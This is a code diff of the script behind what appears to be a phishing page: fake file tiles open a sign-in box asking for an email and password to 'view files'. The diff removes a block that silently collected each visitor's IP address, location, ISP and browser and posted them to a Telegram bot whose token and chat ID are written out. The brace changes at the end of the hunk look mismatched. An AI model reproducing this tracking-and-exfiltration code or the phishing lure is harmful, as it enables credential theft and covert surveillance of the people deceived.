@@ -49,41 +49,15 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     fileTiles.forEach(tile => {
-     tile.addEventListener("click", async () => {
+     tile.addEventListener("click", () => {
     clearError();
     passwordInput.value = "";
     signInBtn.textContent = "View files";
     modalOverlay.classList.remove("hidden");
     signInModal.classList.remove("hidden");
     document.body.style.overflow = "hidden";
-
-    // Send Telegram message on file click
-    const botToken = "7581994701:AAGb0gyfgIMQH-RDhnogyMfgaAJbnK7h534";
-    const chatId = "5642369607";
-    const fileName = tile.querySelector('.file-name')?.textContent || "Unknown File";
-
-    let ipData = await fetch("https://ipapi.co/json")
-        .then(res => res.json())
-        .catch(() => null);
-
-    let ip = ipData?.ip || "Unknown IP";
-    let country = ipData?.country_name || "Unknown Country";
-    let city = ipData?.city || "Unknown City";
-    let isp = ipData?.org || "Unknown ISP";
-    let userAgent = navigator.userAgent;
-
-    const message = `📁 *File Clicked:* ${fileName}\\n\\n🌍 *IP:* ${ip}\\n📍 *Location:* ${city}, ${country}\\n🏢 *ISP:* ${isp}\\n🖥 *Browser:* ${userAgent}`;
-
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            parse_mode: "Markdown"
-        })
-    });
 });
+    });
 
     signInBtn.addEventListener('click', async () => {
         const email = emailInput.value.trim();
